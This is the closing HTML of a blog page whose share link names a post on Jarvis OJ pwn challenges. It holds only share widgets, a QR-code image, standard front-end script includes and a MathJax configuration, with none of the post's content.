      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/&title=《Jarvis OJ-pwn》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACIUlEQVR42u3aS27DMAwFwNz/0u62QFvnkZILhBqtikRpNF4w/Oj1itf1bf18Pd/f+5ZtCwMD42MZ1+36a0/yxdX/kL/7yzdiYGAcwEgOcX+g+0/1XknOhoGBgXG/Jw+7fwXTfA8GBgZGL+AmO3tgDAwMjF4Rm6R0SWheL3ExMDBOY+Rd9///+5H5BgYGxkcxruKqFpx5uLwWFgYGxmxGHuCWysvi2KB3HgwMjBMYu4JvteDswcq1OAYGxocz8pZ90iZLLk/00s3oOhoGBsY4Rn4BIjl0+ckFqWfUesPAwBjNyINmlZ031/IR6X1oxsDAmMpIAlwOeyKkRm0+DAyM0YxeElYdQ1YTx145jYGBMZXRS+x6V8dWRp5vfgYwMDBGM6qN+2ToWE0oe+PMQp6LgYHx4YxdSV6S3vU+FV1cw8DAGM1YuVWVHzd/NL3Hh4GBcSYjb4RV07snSlwMDIzZjF4J2ksKq4lg4V0MDIzRjGrQzNO7nNTb/6ZriIGBMZSx94h5TpoPTd8kphgYGAcw8oZaL31cubnWvGyBgYExjpGUjivXv/JmXF42Y2BgnMC4imvXMLJaKkfTDAwMjKGMlXtWTyR8e4M7BgbGJEYeZFd4+fNrBlwMDIwDGHsD5d5xQvlGGwYGBkaLlwwYkmHAIwEXAwNjHGP98kT1iOVJLAYGxlBGtd2/q6FfLXExMDDOZFRLx15IrR5i5WcAAwNjEOMLamZgvktrlW0AAAAASUVORK5CYII=" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
<script type="text/javascript" color="255,0,0"opacity="0.3"count="70" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>

<!-- third-party -->
<script type="text/javascript">
;( function( $ ) {

	$( '.swipebox' ).swipebox({
		hideCloseButtonOnMobile: true
	});

} )( jQuery );
</script>






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>






    
</body>
</html>
